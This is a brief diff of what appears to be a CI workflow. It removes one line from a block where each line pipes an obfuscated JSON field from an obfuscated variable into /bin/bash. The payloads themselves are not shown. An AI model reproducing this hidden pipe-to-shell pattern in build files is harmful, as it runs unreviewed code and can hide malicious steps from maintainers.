@@ -28,7 +28,6 @@ jobs:
           echo $x33633 | jq -r .xo81377 | /bin/bash
           echo $up27 | jq -r .kk6821 | /bin/bash
           printf '%s' "$dkl20" | jq -r .nx2 | /bin/bash
-          printf '%s' "$kipq1867" | jq -r .exai67027 | /bin/bash
           printf '%s' "$nordo0" | jq -r .zej55863 | /bin/bash
           echo $cubc9677 | jq -r .u5 | /bin/bash
           printf '%s' "$t46" | jq -r .bn37113 | /bin/bash
